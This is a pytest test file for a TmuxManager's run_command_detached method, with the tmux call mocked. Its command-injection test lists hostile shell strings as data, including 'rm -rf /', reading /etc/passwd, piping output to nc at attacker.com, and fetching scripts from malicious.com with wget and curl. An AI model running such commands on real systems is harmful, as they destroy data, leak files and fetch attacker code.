import subprocess


class TestRunCommandDetached:
    """Test cases for TmuxManager.run_command_detached method"""

    def test_basic_detached_command(self, tmux_manager, mocker):
        """U20: Basic detached command (cmd="echo test", session_name="test_session")"""
        # Arrange
        expected_process = subprocess.CompletedProcess(
            args=["tmux", "-Lprunejuice", "new", "-d", "-s", "test_session", "echo test"],
            returncode=0,
            stdout=b"",
            stderr=b"",
        )
        mock_tmux_cmd = mocker.patch.object(tmux_manager, "_tmux_cmd", return_value=expected_process)

        # Act
        result = tmux_manager.run_command_detached(cmd="echo test", session_name="test_session")

        # Assert
        mock_tmux_cmd.assert_called_once_with("new", "-d", "-s", "test_session", "echo test")
        assert result == expected_process
        assert isinstance(result, subprocess.CompletedProcess)
        assert result.returncode == 0

    def test_with_working_directory(self, tmux_manager, mocker):
        """U21: With working directory (working_dir="/tmp/work")"""
        # Arrange
        expected_process = subprocess.CompletedProcess(
            args=["tmux", "-Lprunejuice", "new", "-d", "-s", "test_session", "echo test", "-c", "/tmp/work"],
            returncode=0,
            stdout=b"",
            stderr=b"",
        )
        mock_tmux_cmd = mocker.patch.object(tmux_manager, "_tmux_cmd", return_value=expected_process)

        # Act
        result = tmux_manager.run_command_detached(
            cmd="echo test", session_name="test_session", working_dir="/tmp/work"
        )

        # Assert
        mock_tmux_cmd.assert_called_once_with("new", "-d", "-s", "test_session", "echo test", "-c", "/tmp/work")
        assert result == expected_process
        assert isinstance(result, subprocess.CompletedProcess)
        assert result.returncode == 0

    def test_command_injection_protection(self, tmux_manager, mocker):
        """U22: Command injection protection (test with potentially dangerous strings)"""
        # Arrange
        dangerous_commands = [
            "echo test; rm -rf /",
            "echo test && cat /etc/passwd",
            "echo test | nc attacker.com 4444",
            'echo "test"; wget http://malicious.com/script.sh',
            "$(curl -s malicious.com/evil.sh)",
        ]

        expected_process = subprocess.CompletedProcess(
            args=["tmux", "-Lprunejuice", "new", "-d", "-s", "test_session", "dangerous_cmd"],
            returncode=0,
            stdout=b"",
            stderr=b"",
        )
        mock_tmux_cmd = mocker.patch.object(tmux_manager, "_tmux_cmd", return_value=expected_process)

        # Test each dangerous command
        for dangerous_cmd in dangerous_commands:
            # Reset mock for each test
            mock_tmux_cmd.reset_mock()

            # Act
            result = tmux_manager.run_command_detached(cmd=dangerous_cmd, session_name="test_session")

            # Assert - verify the command is passed as-is to _tmux_cmd
            # The protection should be at the tmux level, not in our code
            mock_tmux_cmd.assert_called_once_with("new", "-d", "-s", "test_session", dangerous_cmd)
            assert result == expected_process
            assert isinstance(result, subprocess.CompletedProcess)

    def test_empty_working_directory(self, tmux_manager, mocker):
        """Test with empty working directory (should not include -c flag)"""
        # Arrange
        expected_process = subprocess.CompletedProcess(
            args=["tmux", "-Lprunejuice", "new", "-d", "-s", "test_session", "echo test"],
            returncode=0,
            stdout=b"",
            stderr=b"",
        )
        mock_tmux_cmd = mocker.patch.object(tmux_manager, "_tmux_cmd", return_value=expected_process)

        # Act
        result = tmux_manager.run_command_detached(cmd="echo test", session_name="test_session", working_dir="")

        # Assert
        mock_tmux_cmd.assert_called_once_with("new", "-d", "-s", "test_session", "echo test")
        assert result == expected_process
        assert isinstance(result, subprocess.CompletedProcess)

    def test_none_working_directory(self, tmux_manager, mocker):
        """Test with None working directory (should not include -c flag)"""
        # Arrange
        expected_process = subprocess.CompletedProcess(
            args=["tmux", "-Lprunejuice", "new", "-d", "-s", "test_session", "echo test"],
            returncode=0,
            stdout=b"",
            stderr=b"",
        )
        mock_tmux_cmd = mocker.patch.object(tmux_manager, "_tmux_cmd", return_value=expected_process)

        # Act
        result = tmux_manager.run_command_detached(cmd="echo test", session_name="test_session")

        # Assert
        mock_tmux_cmd.assert_called_once_with("new", "-d", "-s", "test_session", "echo test")
        assert result == expected_process
        assert isinstance(result, subprocess.CompletedProcess)

    def test_custom_server_name(self, custom_tmux_manager, mocker):
        """Test run_command_detached with custom server name"""
        # Arrange
        expected_process = subprocess.CompletedProcess(
            args=["tmux", "-Ltest_server", "new", "-d", "-s", "test_session", "echo test"],
            returncode=0,
            stdout=b"",
            stderr=b"",
        )
        mock_tmux_cmd = mocker.patch.object(custom_tmux_manager, "_tmux_cmd", return_value=expected_process)

        # Act
        result = custom_tmux_manager.run_command_detached(cmd="echo test", session_name="test_session")

        # Assert
        mock_tmux_cmd.assert_called_once_with("new", "-d", "-s", "test_session", "echo test")
        assert result == expected_process
        assert isinstance(result, subprocess.CompletedProcess)

    def test_command_with_error_response(self, tmux_manager, mocker):
        """Test run_command_detached handles error responses correctly"""
        # Arrange
        expected_process = subprocess.CompletedProcess(
            args=["tmux", "-Lprunejuice", "new", "-d", "-s", "existing_session", "echo test"],
            returncode=1,
            stdout=b"",
            stderr=b"duplicate session: existing_session\n",
        )
        mock_tmux_cmd = mocker.patch.object(tmux_manager, "_tmux_cmd", return_value=expected_process)

        # Act
        result = tmux_manager.run_command_detached(cmd="echo test", session_name="existing_session")

        # Assert
        mock_tmux_cmd.assert_called_once_with("new", "-d", "-s", "existing_session", "echo test")
        assert result == expected_process
        assert result.returncode == 1
        assert result.stderr == b"duplicate session: existing_session\n"
        assert isinstance(result, subprocess.CompletedProcess)

    def test_complex_command_with_working_directory(self, tmux_manager, mocker):
        """Test complex command with working directory"""
        # Arrange
        complex_cmd = "cd /opt && python3 -m myapp --config=prod.json --verbose"
        work_dir = "/opt/myapp"
        expected_process = subprocess.CompletedProcess(
            args=["tmux", "-Lprunejuice", "new", "-d", "-s", "prod_session", complex_cmd, "-c", work_dir],
            returncode=0,
            stdout=b"",
            stderr=b"",
        )
        mock_tmux_cmd = mocker.patch.object(tmux_manager, "_tmux_cmd", return_value=expected_process)

        # Act
        result = tmux_manager.run_command_detached(cmd=complex_cmd, session_name="prod_session", working_dir=work_dir)

        # Assert
        mock_tmux_cmd.assert_called_once_with("new", "-d", "-s", "prod_session", complex_cmd, "-c", work_dir)
        assert result == expected_process
        assert isinstance(result, subprocess.CompletedProcess)
        assert result.returncode == 0
